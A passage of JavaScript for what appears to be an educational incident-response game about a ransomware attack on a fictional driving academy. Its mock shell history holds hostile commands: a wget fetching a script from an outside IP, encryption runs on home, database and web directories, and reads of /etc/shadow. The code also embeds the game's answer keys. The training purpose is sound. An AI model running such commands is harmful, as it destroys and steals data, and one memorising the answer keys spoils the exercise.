+185.220.101.47 - - [21/Mar/2026:16:24:33] "POST /admin/export HTTP/1.1" 200
+185.220.101.47 - - [22/Mar/2026:02:18:55] "POST /api/upload HTTP/1.1" 201
+185.220.101.47 - - [22/Mar/2026:02:19:33] "GET /uploads/temp/update.sh HTTP/1.1" 200
+185.220.101.47 - - [23/Mar/2026:23:46:55] "POST /api/upload HTTP/1.1" 201
+185.220.101.47 - - [23/Mar/2026:23:47:12] "GET /uploads/deploy.py HTTP/1.1" 200`;
+}
+
+function getErrorLog() {
+    return `[Wed Mar 20 15:22:11 2026] [notice] Apache/2.4.41 (Ubuntu) configured -- resuming normal operations
+[Fri Mar 21 16:18:44 2026] [notice] Connection from 185.220.101.47
+[Sat Mar 22 02:18:55 2026] [notice] File upload detected: /uploads/temp/update.sh
+[Sun Mar 23 23:46:55 2026] [notice] File upload detected: /uploads/deploy.py
+[Sun Mar 23 23:47:30 2026] [error] Suspicious activity detected - multiple uploads from same IP`;
+}
+
+function getLogsReadme() {
+    return `# Forensic Snapshot — Log Directory
+=====================================
+Standard system logs are available in this directory:
+  auth.log     — authentication events (logins, failures, sudo)
+  syslog       — general system activity
+  apache2/     — web server access and error logs
+
+NOTE: A full export of user shell activity has been saved separately.
+      Location: ~/exports/user_activity.log`;
+}
+
+function getUserActivityLog() {
+    return `=== FORENSIC USER ACTIVITY EXPORT ===
+Generated: Mar 24, 2026, 09:15 AM
+Source: /var/log/shell_history_backup
+
+--- jwallace (Executive Director) ---
+ls
+cd Documents
+ls
+cat budget_2026.xlsx
+logout
+
+--- smartinez (Office Manager) ---
+ls
+cd Documents
+ls
+passwd
+logout
+
+--- awong (IT Coordinator) ---
+ls /var/log
+cat /var/log/auth.log
+grep "failed" /var/log/auth.log
+sudo systemctl status apache2
+logout
+
+--- mgarcia (Volunteer) ---
+whoami
+id
+sudo -l
+sudo su root
+cd /tmp
+ls -la
+wget http://185.220.101.47/tools/deploy.py
+python3 deploy.py --target /home --encrypt
+ls /home
+cat /etc/passwd
+cat /etc/shadow
+find / -name "*.db" 2>/dev/null
+ls /var/lib/mysql
+python3 deploy.py --target /var/lib/mysql --encrypt
+python3 deploy.py --target /var/www --encrypt
+echo "SSDAC-2024-XK7P9" > /var/www/html/RANSOM_NOTE.txt
+at 08:00 -f /tmp/activate.sh
+
+--- jlopez (Volunteer) ---
+ls
+logout
+
+======================================`;
+}
+
+function docStaffHandbook() {
+    return `SafeStart Driving Academy — Staff Handbook 2026
+================================================
+Section 1: Mission & Values
+Section 2: Code of Conduct
+Section 3: Scheduling & Time Off
+Section 4: Vehicle Use Policy
+  - All vehicles must be inspected before and after use
+  - Report damage to Office Manager within 24 hours
+Section 5: Student Interaction Guidelines
+Section 6: Emergency Procedures
+
+Last updated: January 2026
+Questions? Contact sarah.martinez@safestartdriving.org`;
+}
+
+function docQ1Enrollment() {
+    return `Q1 2026 Enrollment Report — SafeStart Driving Academy
+======================================================
+January:   42 new students enrolled
+February:  38 new students enrolled
+March:     51 new students enrolled (spring surge)
+
+Total Q1:  131 students
+Scholarship recipients: 28
+Waitlist:  17 students
+
+Top referral sources: school partnerships (44%), word of mouth (31%), web (25%)
+Report prepared by: Sarah Martinez, Office Manager`;
+}
+
+function docVehicleMaintenance() {
+    return `Vehicle Maintenance Log — Q1 2026
+===================================
+Vehicle 01 (2019 Toyota Corolla)
+  Feb 3  — Oil change, tire rotation
+  Mar 11 — Brake inspection, passed
+
+Vehicle 02 (2020 Honda Civic)
+  Jan 17 — Oil change
+  Feb 28 — Minor dent repair (student incident, documented separately)
+
+Vehicle 03 (2021 Toyota Corolla)
+  Mar 5  — Oil change, new wiper blades
+  Mar 20 — AC inspection, recharge
+
+All vehicles current on state inspection stickers.
+Next scheduled service: April 2026`;
+}
+
+function docInstructorCerts() {
+    return `Instructor Certifications — SafeStart Driving Academy
+======================================================
+Robert Chan       — State Cert #TX-4421  Expires: Aug 2027
+Lisa Thompson     — State Cert #TX-3892  Expires: Nov 2026
+David Chen        — State Cert #TX-5103  Expires: Mar 2028
+Kavita Patel      — State Cert #TX-4788  Expires: Jun 2027
+Tyler Robinson    — State Cert #TX-5521  Expires: Jan 2028
+Peter Lee         — State Cert #TX-4234  Expires: Sep 2026  ⚠ Renewal due soon
+
+Annual CPR/First Aid recertification: All current as of Feb 2026
+DMV partnership authorization renewed: Jan 2026`;
+}
+
+function docFundraiserNotes() {
+    return `Spring Fundraiser Planning Notes — March 2026
+===============================================
+Event date: May 10, 2026
+Goal: $8,000 (fund 15 additional scholarships)
+
+To-do:
+  - Finalize donor outreach list (Sarah working on this)
+  - Book venue — community center confirmed
+  - Coordinate with board members for sponsorships
+  - Design flyer (volunteer needed)
+  - Set up online donation page
+
+Notes from last meeting (Mar 12):
+  Jennifer wants to highlight student success stories
+  Consider live auction — Tyler offered to help coordinate
+  Need to follow up with Riverside High School partnership`;
+}
+
+// User Audit - Interactive identification system
+const suspiciousAccounts = {
+    'jwallace': {
+        suspicious: true,
+        reasons: ['Malicious IP address (Bulgaria)', 'Account compromised via phishing'],
+        correctReasons: ['Malicious IP address', 'Compromised account'],
+        requiredCount: 2,
+        evidence: 'foreign-ip',
+        points: 20
+    },
+    'mgarcia': {
+        suspicious: true,
+        reasons: ['Volunteer with Domain Admin privileges', 'Malicious IP address (Bulgaria)', 'Late night login (11:45 PM)'],
+        correctReasons: ['Privilege escalation/mismatch (wrong permissions for role)', 'Malicious IP address'],
+        requiredCount: 2,
+        evidence: 'excessive-privileges',
+        points: 25
+    }
+};
+
+function initializeUserAudit() {
+    const users = [
+        ['jwallace', 'Jennifer Wallace', 'Executive Director', 'Domain Admin', 'Mar 21, 4:15 PM', '185.220.101.47', '❌ Disabled'],
+        ['smartinez', 'Sarah Martinez', 'Office Manager', 'Standard User', 'Mar 21, 8:31 AM', '10.0.0.45', '❌ Disabled'],
+        ['awong', 'Alex Wong', 'IT Coordinator', 'IT Admin', 'Mar 21, 10:22 AM', '192.168.1.100', '❌ Disabled'],
+        ['rchan', 'Robert Chan', 'Instructor', 'Instructor', 'Mar 20, 3:45 PM', '192.168.2.102', '❌ Disabled'],
+        ['lthompson', 'Lisa Thompson', 'Instructor', 'Instructor', 'Mar 22, 9:30 AM', '73.185.42.100', '❌ Disabled'],
+        ['mgarcia', 'Marcus Garcia', 'Volunteer', 'Domain Admin', 'Mar 23, 11:45 PM', '185.220.101.47', '❌ Disabled'],
+        ['jlopez', 'Julia Lopez', 'Volunteer', 'Limited Access', 'Mar 18, 1:30 PM', '192.168.1.106', '❌ Disabled'],
+        ['dchen', 'David Chen', 'Instructor', 'Instructor', 'Mar 19, 2:15 PM', '192.168.2.108', '❌ Disabled'],
+        ['kpatel', 'Kavita Patel', 'Instructor', 'Instructor', 'Mar 21, 9:45 AM', '10.0.0.110', '❌ Disabled'],
+        ['bnguyen', 'Brian Nguyen', 'Volunteer', 'Limited Access', 'Mar 17, 4:20 PM', '192.168.2.112', '❌ Disabled'],
+        ['mjohnson', 'Michelle Johnson', 'Office Assistant', 'Standard User', 'Mar 20, 1:10 PM', '192.168.1.47', '❌ Disabled'],
+        ['trobinson', 'Tyler Robinson', 'Instructor', 'Instructor', 'Mar 22, 11:00 AM', '10.0.0.115', '❌ Disabled'],
+        ['akim', 'Angela Kim', 'Curriculum Coordinator', 'Standard User', 'Mar 21, 2:30 PM', '192.168.1.50', '❌ Disabled'],
+        ['jmorales', 'Jose Morales', 'Facilities Manager', 'Limited Access', 'Mar 19, 7:45 AM', '192.168.2.118', '❌ Disabled'],
+        ['staylor', 'Samantha Taylor', 'Volunteer', 'Limited Access', 'Mar 16, 3:00 PM', '192.168.1.120', '❌ Disabled'],
+        ['plee', 'Peter Lee', 'Instructor', 'Instructor', 'Mar 23, 8:15 AM', '98.207.11.22', '❌ Disabled'],
+        ['hwilson', 'Hannah Wilson', 'Outreach Coordinator', 'Standard User', 'Mar 20, 10:30 AM', '108.54.203.7', '❌ Disabled']
+    ];
+
+    const tbody = document.getElementById('user-table-body');
+    tbody.innerHTML = ''; // Clear any prior rows so re-init doesn't duplicate
+    users.forEach((user, index) => {
+        const tr = document.createElement('tr');
+        tr.dataset.username = user[0];
+        tr.dataset.rowIndex = index;
+        tr.innerHTML = `
+            <td>${user[0]}</td>
+            <td>${user[1]}</td>
+            <td>${user[2]}</td>
+            <td>${user[3]}</td>
+            <td>${user[4]}</td>
+            <td>${user[5]}</td>
+            <td>${user[6]}</td>
+        `;
+
+        // Add click handler
+        tr.onclick = function() {
+            if (this.classList.contains('already-checked')) return;
+            handleAuditRowClick(user[0], user);
+        };
+
+        tbody.appendChild(tr);
+    });
+
+    updateAuditProgress();
+}
+
+function handleAuditRowClick(username, userData) {
+    gameState.currentAuditRow = { username, userData };
+
+    const accountInfo = suspiciousAccounts[username];
+    const pickTwo = accountInfo && accountInfo.requiredCount === 2;
+
+    document.getElementById('audit-question').textContent = `You selected: ${userData[1]} (${userData[0]})\n\n${pickTwo ? 'Select TWO reasons this account is suspicious:' : 'Why is this account suspicious?'}`;
+
+    const optionsContainer = document.getElementById('audit-options');
+    optionsContainer.innerHTML = '';
+
+    const options = [
+        'Malicious IP address',
+        'Privilege escalation/mismatch (wrong permissions for role)',
+        'Unusual login time',
+        'Compromised account',
+        'This account is NOT suspicious'
+    ];
+
+    options.forEach((option, index) => {
+        const optionEl = document.createElement('div');
+        optionEl.className = 'quiz-option';
+        optionEl.dataset.index = index;
+        optionEl.dataset.answer = option;
+        optionEl.textContent = option;
+        optionEl.onclick = () => selectAuditOption(index, pickTwo, option);
+        optionsContainer.appendChild(optionEl);
+    });
+
+    document.getElementById('audit-submit-btn').style.display = 'block';
+    document.getElementById('audit-continue-btn').style.display = 'none';
+    document.getElementById('audit-feedback').classList.remove('visible', 'correct', 'incorrect');
+    document.getElementById('audit-modal').classList.add('active');
+}
+
+function selectAuditOption(index, pickTwo, answer) {
+    const notSuspiciousEl = document.querySelector(`#audit-options .quiz-option[data-answer="This account is NOT suspicious"]`);
+    const clicked = document.querySelector(`#audit-options .quiz-option[data-index="${index}"]`);
+
+    if (!pickTwo) {
+        // Single select
+        document.querySelectorAll('#audit-options .quiz-option').forEach(opt => opt.classList.remove('selected'));
+        clicked.classList.add('selected');
+        return;
+    }
+
+    // Multi-select (pick two)
+    if (answer === 'This account is NOT suspicious') {
+        // Selecting "not suspicious" deselects everything else
+        document.querySelectorAll('#audit-options .quiz-option').forEach(opt => opt.classList.remove('selected'));
+        clicked.classList.add('selected');
+        return;
+    }
+
+    // Deselect "not suspicious" if selecting a reason
+    notSuspiciousEl.classList.remove('selected');
+
+    // Toggle this option
+    if (clicked.classList.contains('selected')) {
+        clicked.classList.remove('selected');
+    } else {
+        const currentSelected = document.querySelectorAll('#audit-options .quiz-option.selected:not([data-answer="This account is NOT suspicious"])');
+        if (currentSelected.length >= 2) {
+            alert('Select a maximum of two reasons.');
+            return;
+        }
+        clicked.classList.add('selected');
+    }
+}
+
+function submitAuditIdentification() {
+    const selectedEls = document.querySelectorAll('#audit-options .quiz-option.selected');
+    if (selectedEls.length === 0) {
+        alert('Please select at least one reason first.');
+        return;
+    }
+
+    const username = gameState.currentAuditRow.username;
+    if (gameState.auditIdentified.has(username)) {
+        alert('This account has already been identified. No additional points can be earned.');
+        closeAuditModal();
+        return;
+    }
+    const selectedReasons = Array.from(selectedEls).map(el => el.dataset.answer);
+    const feedbackEl = document.getElementById('audit-feedback');
+    const accountInfo = suspiciousAccounts[username];
+    const tr = document.querySelector(`tr[data-username="${username}"]`);
+    const pickTwo = accountInfo && accountInfo.requiredCount === 2;
+
+    if (selectedReasons.includes('This account is NOT suspicious')) {
+        if (!accountInfo || !accountInfo.suspicious) {
+            feedbackEl.textContent = 'Correct! This account appears normal with appropriate permissions and no suspicious activity.';
+            feedbackEl.classList.add('visible', 'correct');
+            tr.classList.add('identified-correct', 'already-checked');
+        } else {
+            gameState.auditWrongGuesses++;
+            feedbackEl.textContent = `Incorrect. This account IS suspicious! Look more carefully at: ${accountInfo.reasons.join(', ')}`;
+            feedbackEl.classList.add('visible', 'incorrect');
+            tr.classList.add('identified-incorrect', 'already-checked');
+        }
+    } else if (accountInfo && accountInfo.suspicious) {
+        if (pickTwo) {
+            if (selectedReasons.length < 2) {
+                alert('This account has two suspicious flags — please select two reasons.');
+                return;
+            }
+            const correctCount = selectedReasons.filter(r => accountInfo.correctReasons.includes(r)).length;
+            if (correctCount === 2) {
+                const pointsAwarded = calculateAuditPoints(accountInfo.points);
+                gameState.score += pointsAwarded;
+                updateScore();
+                gameState.auditIdentified.add(username);
+                if (accountInfo.evidence) discoverEvidence(accountInfo.evidence);
+                feedbackEl.textContent = `Excellent! Both flags identified correctly. +${pointsAwarded} points\n\nDetails: ${accountInfo.reasons.join(', ')}`;
+                feedbackEl.classList.add('visible', 'correct');
+                tr.classList.add('identified-correct', 'already-checked');
+            } else if (correctCount === 1) {
+                const pointsAwarded = Math.floor(calculateAuditPoints(accountInfo.points) / 2);
+                gameState.score += pointsAwarded;
+                updateScore();
+                gameState.auditIdentified.add(username);
+                if (accountInfo.evidence) discoverEvidence(accountInfo.evidence);
+                gameState.auditWrongGuesses++;
+                feedbackEl.textContent = `Partially correct — you found one of two flags. +${pointsAwarded} points\n\nBoth flags: ${accountInfo.correctReasons.join(' and ')}`;
+                feedbackEl.classList.add('visible', 'incorrect');
+                tr.classList.add('identified-incorrect', 'already-checked');
+            } else {
+                gameState.auditWrongGuesses++;
+                feedbackEl.textContent = `Incorrect. This account IS suspicious for different reasons: ${accountInfo.correctReasons.join(' and ')}`;
+                feedbackEl.classList.add('visible', 'incorrect');
+                tr.classList.add('identified-incorrect', 'already-checked');
+            }
+        } else {
+            // Single select suspicious account
+            const isCorrect = accountInfo.correctReasons.includes(selectedReasons[0]);
+            if (isCorrect) {
+                const pointsAwarded = calculateAuditPoints(accountInfo.points);
+                gameState.score += pointsAwarded;
+                updateScore();
+                gameState.auditIdentified.add(username);
+                if (accountInfo.evidence) discoverEvidence(accountInfo.evidence);
+                feedbackEl.textContent = `Excellent! Correctly identified. +${pointsAwarded} points\n\nDetails: ${accountInfo.reasons.join(', ')}`;
+                feedbackEl.classList.add('visible', 'correct');
+                tr.classList.add('identified-correct', 'already-checked');
+            } else {
+                gameState.auditWrongGuesses++;
+                feedbackEl.textContent = `Partially correct — this account IS suspicious, but for a different reason: ${accountInfo.reasons.join(', ')}`;
+                feedbackEl.classList.add('visible', 'incorrect');
+                tr.classList.add('identified-incorrect', 'already-checked');
+            }
+        }
+    } else {
+        gameState.auditWrongGuesses++;
+        feedbackEl.textContent = 'Incorrect. This account appears normal with appropriate permissions for their role and no suspicious activity.';
+        feedbackEl.classList.add('visible', 'incorrect');
+        tr.classList.add('identified-incorrect', 'already-checked');
+    }
+
+    document.getElementById('audit-submit-btn').style.display = 'none';
+    document.getElementById('audit-continue-btn').style.display = 'block';
+    updateAuditProgress();
+}
+
+function calculateAuditPoints(basePoints) {
+    // Reduce points based on wrong guesses
+    if (gameState.auditWrongGuesses === 0) return basePoints;
+    if (gameState.auditWrongGuesses === 1) return Math.floor(basePoints * 0.8);
+    if (gameState.auditWrongGuesses === 2) return Math.floor(basePoints * 0.6);
+    if (gameState.auditWrongGuesses >= 3) return Math.floor(basePoints * 0.4);
+}
+
+function updateAuditProgress() {
+    const totalSuspicious = Object.keys(suspiciousAccounts).filter(u => suspiciousAccounts[u].suspicious).length;
+    const found = gameState.auditIdentified.size;
+    const progressEl = document.getElementById('audit-progress');
+
+    if (found === totalSuspicious) {
+        progressEl.innerHTML = `<span style="color: #4ade80;">✓ All suspicious accounts identified! (${found}/${totalSuspicious})</span>`;
+        if (gameState.auditWrongGuesses > 0) {
+            progressEl.innerHTML += `<br><span style="color: #ff6b6b; font-size: 12px;">Wrong guesses: ${gameState.auditWrongGuesses} (points reduced)</span>`;
+        }
+    } else if (found > 0) {
+        progressEl.innerHTML = `Suspicious accounts found: ${found}/${totalSuspicious}`;
+        if (gameState.auditWrongGuesses > 0) {
+            progressEl.innerHTML += `<span style="color: #ff6b6b; margin-left: 15px;">Wrong guesses: ${gameState.auditWrongGuesses}</span>`;
+        }
+    } else {
+        progressEl.innerHTML = '';
+    }
+}
+
+function backToAudit() {
+    // Simply close the modal without marking as analyzed, allowing user to reconsider
+    document.getElementById('audit-modal').classList.remove('active');
+    document.getElementById('audit-feedback').classList.remove('visible', 'correct', 'incorrect');
+    gameState.currentAuditRow = null;
+}
+
+function closeAuditModal() {
+    document.getElementById('audit-modal').classList.remove('active');
+    document.getElementById('audit-feedback').classList.remove('visible', 'correct', 'incorrect');
+    gameState.currentAuditRow = null;
+}
+
+// Timeline Builder
+let timelineSlots = {}; // Track which event is in which slot
+
+function initializeTimeline() {
+    const eventsContainer = document.getElementById('timeline-events');
+    const dropZone = document.getElementById('timeline-drop-zone');
+
+    // Clear any existing content
+    eventsContainer.innerHTML = '';
+    dropZone.innerHTML = '';
+    timelineSlots = {};
+
+    // Create numbered slots (1-10)
+    for (let i = 1; i <= timelineEvents.length; i++) {
+        const slot = document.createElement('div');
+        slot.className = 'timeline-slot';
+        slot.dataset.slotNumber = i;
+        slot.innerHTML = `<div class="slot-number">${i}</div><div class="slot-placeholder">Drop event here...</div>`;
+
+        // Allow drops on slots
+        slot.addEventListener('dragover', e => {
+            e.preventDefault();
+            slot.classList.add('drag-over');
+        });
+
+        slot.addEventListener('dragleave', () => {
+            slot.classList.remove('drag-over');
+        });
+
+        slot.addEventListener('drop', e => {
+            e.preventDefault();
+            slot.classList.remove('drag-over');
+            const eventId = parseInt(e.dataTransfer.getData('text/plain'));
+            const slotNum = parseInt(slot.dataset.slotNumber);
+            placeEventInSlot(eventId, slotNum);
+        });
+
+        dropZone.appendChild(slot);
+    }
+
+    // Shuffle and display available events
+    const shuffled = [...timelineEvents].sort(() => Math.random() - 0.5);
+    shuffled.forEach(event => {
+        const item = createTimelineItem(event);
+        eventsContainer.appendChild(item);
+    });
+
+    // Allow dragging back to available events area
+    eventsContainer.addEventListener('dragover', e => {
+        e.preventDefault();
+    });
+
+    eventsContainer.addEventListener('drop', e => {
+        e.preventDefault();
+        const eventId = parseInt(e.dataTransfer.getData('text/plain'));
+        removeEventFromSlot(eventId);
+    });
+
+    // Auto-scroll when dragging near top or bottom of viewport
+    document.addEventListener('dragover', function autoscroll(e) {
+        const threshold = 100;
+        const speed = 12;
+        if (e.clientY < threshold) {
+            window.scrollBy(0, -speed);
+        } else if (e.clientY > window.innerHeight - threshold) {
+            window.scrollBy(0, speed);
+        }
+    });
+}
+
+function createTimelineItem(event) {
+    const item = document.createElement('div');
+    item.className = 'timeline-item';
+    item.draggable = true;
+    item.dataset.eventId = event.id;
+    item.innerHTML = `${event.text}`;
+
+    item.addEventListener('dragstart', e => {
+        e.dataTransfer.setData('text/plain', event.id);
+        item.classList.add('dragging');
+    });
+
+    item.addEventListener('dragend', () => {
+        item.classList.remove('dragging');
+    });
+
+    return item;
+}
+
+function placeEventInSlot(eventId, slotNumber) {
+    const event = timelineEvents.find(ev => ev.id === eventId);
+    if (!event) return;
+
+    // Clear any "incorrect" red highlights from a previous submit attempt
+    document.querySelectorAll('.timeline-slot').forEach(s => {
+        s.style.borderColor = '';
+        s.style.background = '';
+    });
+
+    // If this event is already in another slot, clear it from there (no return to pool)
+    for (let slot in timelineSlots) {
+        if (timelineSlots[slot] === eventId) {
+            const oldSlotNum = parseInt(slot);
+            delete timelineSlots[oldSlotNum];
+            const oldSlot = document.querySelector(`.timeline-slot[data-slot-number="${oldSlotNum}"]`);
+            const oldItem = oldSlot.querySelector('.timeline-item');
+            if (oldItem) oldItem.remove();
+            oldSlot.querySelector('.slot-placeholder').style.display = 'block';
+            break;
+        }
+    }
+
+    // If the target slot already has a different event, return that one to the pool
+    if (timelineSlots[slotNumber] && timelineSlots[slotNumber] !== eventId) {
+        const displacedId = timelineSlots[slotNumber];
+        const displacedEvent = timelineEvents.find(ev => ev.id === displacedId);
+        delete timelineSlots[slotNumber];
+        if (displacedEvent) {
+            const eventsContainer = document.getElementById('timeline-events');
+            eventsContainer.appendChild(createTimelineItem(displacedEvent));
+        }
+    }
+
+    // Remove from available events pool
+    document.querySelectorAll('#timeline-events .timeline-item').forEach(el => {
+        if (parseInt(el.dataset.eventId) === eventId) el.remove();
+    });
+
+    // Place event in slot
+    timelineSlots[slotNumber] = eventId;
+    const slot = document.querySelector(`.timeline-slot[data-slot-number="${slotNumber}"]`);
+    const existingItem = slot.querySelector('.timeline-item');
+    if (existingItem) existingItem.remove();
+    slot.querySelector('.slot-placeholder').style.display = 'none';
+    slot.appendChild(createTimelineItem(event));
+}
+
+function removeEventFromSlot(eventId) {
+    const event = timelineEvents.find(ev => ev.id === eventId);
+    if (!event) return;
+
+    // Find and clear the slot
+    let wasInSlot = false;
+    for (let slotNum in timelineSlots) {
+        if (timelineSlots[slotNum] === eventId) {
+            delete timelineSlots[slotNum];
+
+            const slot = document.querySelector(`.timeline-slot[data-slot-number="${slotNum}"]`);
+            const item = slot.querySelector('.timeline-item');
+            if (item) item.remove();
+            slot.querySelector('.slot-placeholder').style.display = 'block';
+            wasInSlot = true;
+            break;
+        }
+    }
+
+    // If the event wasn't in a slot, it was dragged from the pool back to the
+    // pool — nothing to do. Re-adding would create a duplicate.
+    if (!wasInSlot) return;
+
+    // Add back to available events (guard against duplicates just in case)
+    const eventsContainer = document.getElementById('timeline-events');
+    const alreadyThere = eventsContainer.querySelector(`.timeline-item[data-event-id="${eventId}"]`);
+    if (alreadyThere) return;
+    eventsContainer.appendChild(createTimelineItem(event));
+}
+
+function submitTimeline() {
+    if (gameState.timelineSubmitted) {
+        alert('Timeline has already been submitted. It cannot be resubmitted.');
+        return;
+    }
+    if (typeof gameState.timelineAttempts !== 'number') gameState.timelineAttempts = 0;
+
+    // Check if all slots are filled
+    if (Object.keys(timelineSlots).length !== timelineEvents.length) {
+        alert('Please arrange all events in the timeline first. Fill all 8 slots.');
+        return;
+    }
+
+    const isFirstAttempt = gameState.timelineAttempts === 0;
+    const confirmMsg = isFirstAttempt
+        ? 'Are you sure you want to submit your timeline?'
+        : 'This is your final attempt. Submit now?';
+    if (!confirm(confirmMsg)) {
+        return;
+    }
+
+    // Build array of event IDs in slot order
+    let placedOrder = [];
+    for (let i = 1; i <= timelineEvents.length; i++) {
+        if (timelineSlots[i]) {
+            placedOrder.push(timelineSlots[i]);
+        } else {
+            alert('Please fill all timeline slots before submitting.');
+            return;
+        }
+    }
+
+    // Count correct positions
+    const sortedCorrect = [...timelineEvents].sort((a, b) => a.correctOrder - b.correctOrder);
+    let correctCount = 0;
+    const wrongSlots = [];
+    for (let i = 0; i < placedOrder.length; i++) {
+        if (placedOrder[i] === sortedCorrect[i].id) {
+            correctCount++;
+        } else {
+            wrongSlots.push(i + 1);
+        }
+    }
+
+    gameState.timelineAttempts++;
+
+    // First attempt + not perfect → mark wrong slots red and let them retry
+    if (isFirstAttempt && correctCount < 8) {
+        // Clear any prior highlights, then mark wrong slots red
+        document.querySelectorAll('.timeline-slot').forEach(s => {
+            s.style.borderColor = '';
+            s.style.background = '';
+        });
+        wrongSlots.forEach(slotNum => {
+            const slot = document.querySelector(`.timeline-slot[data-slot-number="${slotNum}"]`);
+            if (slot) {
+                slot.style.borderColor = '#ff4444';
+                slot.style.background = 'rgba(255, 68, 68, 0.15)';
+            }
+        });
+        alert('You get one more chance to complete the timeline correctly! Choose carefully!');
+        return;
+    }
+
+    // Partial credit scoring
+    let pointsAwarded = 0;
+    if (correctCount === 8)      pointsAwarded = 50;
+    else if (correctCount === 7) pointsAwarded = 35;
+    else if (correctCount >= 5)  pointsAwarded = 20;
+    else if (correctCount >= 3)  pointsAwarded = 10;
+
+    gameState.timelineSubmitted = true;
+    gameState.timelinePoints = pointsAwarded;
+    gameState.timelineCorrect = correctCount === 8;
+    gameState.timelineFinalOrder = placedOrder.slice();
+    gameState.score += pointsAwarded;
+    updateScore();
+
+    // Build feedback message
+    let msg = '';
+    let color = '';
+    let lockHTML = '';
+
+    if (correctCount === 8) {
+        msg = `Perfect timeline! All 8 events in the correct order.\n+50 points`;
+        color = '#00ff00';
+        lockHTML = `<p style="color:#00ff00;font-weight:bold;">✓ TIMELINE PERFECT — +50 points</p>`;
+    } else if (correctCount === 7) {
+        msg = `Good work — ${correctCount}/8 events in the correct order.\n+35 points`;
+        color = '#4ade80';
+        lockHTML = `<p style="color:#4ade80;font-weight:bold;">✓ TIMELINE SUBMITTED — ${correctCount}/8 correct (+35 points)</p>`;
+    } else if (correctCount >= 5) {
+        msg = `Partial credit — ${correctCount}/8 events in the correct order.\n+20 points`;
+        color = '#ffaa00';
+        lockHTML = `<p style="color:#ffaa00;font-weight:bold;">⚠ TIMELINE SUBMITTED — ${correctCount}/8 correct (+20 points)</p>`;
+    } else if (correctCount >= 3) {
+        msg = `${correctCount}/8 events correct — you may have missed some evidence.\n+10 points`;
+        color = '#ff8800';
+        lockHTML = `<p style="color:#ff8800;font-weight:bold;">⚠ TIMELINE SUBMITTED — ${correctCount}/8 correct (+10 points)</p>`;
+    } else {
+        msg = `${correctCount}/8 events correct — make sure you've investigated all the evidence.\n+0 points`;
+        color = '#ff6b6b';
+        lockHTML = `<p style="color:#ff6b6b;font-weight:bold;">✗ TIMELINE SUBMITTED — ${correctCount}/8 correct (+0 points)</p>`;
+    }
+
+    // Stash result and reveal review-questions prompt; results shown after review
+    gameState.pendingTimelineMsg = msg;
+    const submitBtn = document.getElementById('submit-timeline-btn');
+    if (submitBtn) submitBtn.style.display = 'none';
+    const prompt = document.getElementById('timeline-review-prompt');
+    if (prompt) prompt.style.display = 'block';
+}
+
+function startTimelineReview() {
+    const prompt = document.getElementById('timeline-review-prompt');
+    if (prompt) prompt.style.display = 'none';
+    if (!gameState.answeredQuizzes.has('privilege-quiz')) {
+        showQuiz('privilege-quiz');
+    } else if (!gameState.answeredQuizzes.has('mfa-quiz')) {
+        showQuiz('mfa-quiz');
+    } else if (!gameState.answeredQuizzes.has('terminal-access-quiz')) {
+        showQuiz('terminal-access-quiz');
+    } else {
+        revealTimelineResults();
+    }
+}
+
+function revealTimelineResults() {
+    const msg = gameState.pendingTimelineMsg || '';
+    gameState.pendingTimelineMsg = null;
+    alert(msg + '\n\nNext: Answer 3 reflection questions, then submit your Incident Response Plan.');
+    showReflectionScreen();
+}
+
+// IR Plan
+function initializeIRPlan() {
+    const plans = [
+        {
+            id: 1,
+            title: 'Incident Response Plan A',
+            description: 'Immediate: Reset Executive Director password, implement MFA for the Executive Director only, block Bulgaria IP address. Technical: Install enhanced antivirus software, update firewall rules. Policy: Mandatory phishing training for all staff. Communication: Notify internal staff about the breach.',
+            correct: false
+        },
+        {
+            id: 2,
+            title: 'Incident Response Plan B',
+            description: 'Immediate: Reset all passwords system-wide, enable MFA on all accounts, audit and revoke excessive privileges. Technical: Implement least privilege access controls, deploy email filtering and anti-phishing tools, establish security monitoring and logging. Policy: Mandatory security awareness training including AI safety and data handling, enforce strong password policies, conduct regular permission audits. Communication: Notify all affected students/donors with transparency, offer credit monitoring services.',
+            correct: true
+        },
+        {
+            id: 3,
+            title: 'Incident Response Plan C',
+            description: 'Immediate: Reset compromised accounts, restore from clean backups. Technical: Deploy advanced endpoint protection, implement network segmentation, enable MFA for sensitive accounts, install email gateway security. Policy: Create incident response procedures, update acceptable use policy. Communication: Internal notification to staff about security improvements.',
+            correct: false
+        },
+        {
+            id: 4,
+            title: 'Incident Response Plan D',
+            description: 'Immediate: Engage managed security service provider (MSSP) to handle response. Technical: Migrate to cloud-based infrastructure with built-in security, implement MSSP-recommended tools and monitoring. Policy: Fully outsource security decisions to the MSSP with no internal oversight, quarterly audits by external vendor. Communication: Announce the new MSSP partnership in the next quarterly newsletter.',
+            correct: false
+        }
+    ];
+
+    const container = document.querySelector('.ir-plan-options');
+    container.innerHTML = ''; // Clear any existing options to prevent duplicates
+    plans.forEach(plan => {
+        const option = document.createElement('div');
+        option.className = 'ir-plan-option';
+        option.dataset.planId = plan.id;
+        option.dataset.correct = plan.correct;
+        option.innerHTML = `
+            <h3>${plan.title}</h3>
+            <p>${plan.description}</p>
+        `;
+        option.onclick = function() {
+            document.querySelectorAll('.ir-plan-option').forEach(o => o.classList.remove('selected'));
+            this.classList.add('selected');
+        };
+        container.appendChild(option);
+    });
+}
+
+function submitIRPlan() {
+    if (gameState.irPlanSubmitted) {
+        alert('IR plan has already been submitted.');
+        return;
+    }
+    // Check if timeline and reflection are completed first
+    if (!gameState.timelineSubmitted) {
+        alert('You must complete the Attack Timeline before submitting an incident response plan.');
+        return;
+    }
+    if (!gameState.reflectionSubmitted) {
+        alert('You must complete the Reflection Questions before submitting an incident response plan. Submit your timeline first to unlock them.');
+        return;
+    }
+
+    const selected = document.querySelector('.ir-plan-option.selected');
+    if (!selected) {
+        alert('Please select an incident response plan first.');
+        return;
+    }
+
+    const correct = selected.dataset.correct === 'true';
+
+    // Mark as submitted and track correctness
+    gameState.irPlanSubmitted = true;
+    gameState.irPlanCorrect = correct;
+
+    if (correct) {
+        gameState.score += 100;
+        updateScore();
+        showResults();
+    } else {
+        // Still show results even if wrong
+        showResults();
+    }
+}
+
+// Reflection Questions
+const reflectionQuestions = [
+    {
+        id: 'nist',
+        category: 'Framework',
+        question: 'The NIST Cybersecurity Framework has five steps: Identify (know what you have), Protect (lock it down), Detect (spot threats), Respond (stop the attack), and Recover (get back to normal). Which step covers what SafeStart needs to do right now?',
+        options: [
+            { text: 'Identify', correct: false },
+            { text: 'Protect', correct: false },
+            { text: 'Detect', correct: false },
+            { text: 'Respond', correct: true }
+        ],
+        feedback: {
